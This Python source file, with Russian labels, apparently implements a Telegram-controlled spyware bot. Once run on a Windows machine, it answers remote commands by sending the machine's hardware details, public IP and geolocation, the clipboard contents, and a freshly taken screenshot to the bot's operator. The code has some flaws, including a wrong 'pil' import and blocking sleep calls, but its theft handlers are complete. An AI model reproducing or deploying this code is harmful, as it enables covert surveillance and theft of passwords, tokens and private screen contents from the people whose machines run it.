import psutil, win32api, GPUtil, platform, time, requests, pyperclip, cv2, os
import pyautogui as p  

from pil import ImageGrab
from aiogram import types, Bot, Dispatcher, executor 


bot = Bot(token="your_token") 
dp = Dispatcher(bot) 

@dp.message_handler(commands=['info']) 
async def st(message: types.Message):  
    
        def get_size(bytes, suffix="B"):
                    factor = 1024
                    for unit in ["", "K", "M", "G", "T", "P"]:
                        if bytes < factor:
                            return f"{bytes:.2f}{unit}{suffix}"
                        bytes /= factor
        uname = platform.uname()

        namepc = "\nИмя пк: " + str(uname.node)
        countofcpu = psutil.cpu_count(logical=True)
        allcpucount = "\nОбщее количество ядер процессора:" + str(countofcpu) 

        cpufreq = psutil.cpu_freq()
        cpufreqincy = "\nЧастота процессора: " + str(cpufreq.max) + 'Mhz'


        svmem = psutil.virtual_memory()
        allram = "\nОбщая память ОЗУ: " + str(get_size(svmem.total))
        ramfree = "\nДоступно: " + str(get_size(svmem.available))
        ramuseg = "\nИспользуется: " + str(get_size(svmem.used))

        partitions = psutil.disk_partitions()
        for partition in partitions:
                nameofdevice = "\nДиск: " + str(partition.device)
                nameofdick = "\nИмя диска: " + str(partition.mountpoint)
                typeoffilesystem = "\nТип файловой системы: " + str(partition.fstype)
                #try:
                        #partition_usage = psutil.disk_usage(partition.mountpoint)
               # except PermissionError:

                        #continue
                #allstorage = "\nОбщая память: " + str(get_size(partition_usage.total))
                #usedstorage = "\nИспользуется: " + str(get_size(partition_usage.used))
                #freestorage = "\nСвободно: " + str(get_size(partition_usage.free))




                try:
                    gpus = GPUtil.getGPUs()
                    list_gpus = []
                    for gpu in gpus:

                        gpu_name = "\nМодель видеокарты: " + gpu.name

                        gpu_free_memory = "\nСвободно памяти в видеокарте: " + f"{gpu.memoryFree}MB"

                        gpu_total_memory = "\nОбщая память видеокарты: " f"{gpu.memoryTotal}MB"

                        gpu_temperature = "\nТемпература видеокарты в данный момент: " f"{gpu.temperature} °C"
                except:
                    print('\nВидеокарты нету либо она встроенная')

                headers = {
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
                }
                drives = str(win32api.GetLogicalDriveStrings())
                drives = str(drives.split('\000')[:-1])

                try:
                    ip = requests.get('https://api.ipify.org').text
                    urlloc = 'http://ip-api.com/json/'+ip
                    location1 = requests.get(urlloc, headers=headers).text
                except Exception as e:
                    location1 = "Неизвестно"
                    print(e)
        all_data = "Время: " + time.asctime() + '\n' + '\n' + "Процессор: " + platform.processor() + '\n' + "Система: " + platform.system() + ' ' + platform.release() + '\nДанные локации и IP:' + location1 + '\nДиски:' + drives + str(namepc) + str(allcpucount) + str(cpufreq) + str(cpufreqincy) + str(svmem) + str(allram) + str(ramfree) + str(ramuseg) + str(nameofdevice) + str(nameofdick) + str(typeoffilesystem ) 
                
        await message.reply(all_data)  
        time.sleep(10003)
        
@dp.message_handler(commands=['bufer'])
async def seex(message: types.Message):
            
            Buffer = pyperclip.paste()
            await message.reply(f'Буфер обмена:\n<code>{Buffer}</code>',parse_mode='HTML') 
            time.sleep(1000)

@dp.message_handler(commands=['srin'])
async def srin(message: types.Message): 
            screen = ImageGrab.grab()
            screen.save(os.getcwd() + '\\sreenshot.jpg')
            f = open(os.getcwd() + '\\sreenshot.jpg',"rb")
            await message.reply_document( f)
            try:
                os.remove(os.getcwd() + '\\sreenshot.jpg')
            except Exception as e:
                await message.reply( e)
if __name__ == '__main__': 
      executor.start_polling(dp, skip_updates=True)
